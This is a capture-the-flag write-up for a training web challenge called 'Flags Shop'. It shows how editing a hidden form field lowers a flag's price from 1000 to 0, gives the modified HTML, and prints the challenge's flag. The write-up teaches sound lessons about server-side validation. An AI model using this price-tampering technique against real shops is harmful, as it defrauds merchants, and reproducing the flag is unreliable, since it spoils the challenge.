## Challenge Name: Flags Shop
**Category:** Web

**Challenge Description:**

Wow, this site sells some amazing "flags", but the one I want costs too much. Can you help me?

Website: http://shops.challs.olicyber.it

### Approach

Upon inspecting the HTML source code of the Flags Shop page, we notice that there are three flags available for purchase:

1. French Flag: €10
2. Italian Flag: €100
3. Anonymous Flag: €1000

However, the price of the Anonymous Flag seems unusually high compared to the others since we only have €100.

### Exploiting the Vulnerability

By examining the HTML code, we notice that the price of the Anonymous Flag is set to €1000. However, upon closer inspection, we find that there's a possibility that the price check might not be implemented correctly, it's done client side and not server side.

We can manipulate the form data before submitting it to the server. Specifically, we can change the price of the Anonymous Flag from €1000 to €0 and attempt to purchase it.

### Solution

1. **Inspect the HTML Source Code:** Examine the HTML source code of the Flags Shop page to identify the pricing of the flags.
```
<div class="card-title">Bandiera anonymous</div>
<div class="card-text">1000 €</div>
<form action="buy.php" method="POST" class="mt-2">
    <input type="hidden" name="id" value="2">
    <input type="hidden" name="costo" value="1000">
    <button type="submit" class="btn btn-primary">ACQUISTA</button>
</form>                  
```

2. **Manipulate Form Data:** Change the price of the Anonymous Flag from €1000 to €0 by modifying the hidden input field `costo` in the form.

```
<div class="card-title">Bandiera anonymous</div>
<div class="card-text">1000 €</div>
<form action="buy.php" method="POST" class="mt-2">
    <input type="hidden" name="id" value="2">
    <input type="hidden" name="costo" value="0">
    <button type="submit" class="btn btn-primary">ACQUISTA</button>
</form>                  
```

3. **Purchase the Flag:** Submit the modified form data to the server by clicking the "ACQUISTA" (PURCHASE) button for the Anonymous Flag.

4. **Obtain the Flag:** Upon successful purchase, the server should respond with the purchased flag.

### Flag
```
flag{gr4zi3_p3r_l_4cqu1st0}
```


### Reflections

This challenge demonstrates the importance of implementing proper server-side validation and price checks to prevent manipulation of form data by users. In this case, the vulnerability allowed us to exploit the pricing logic and obtain the flag at a significantly reduced price.

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>
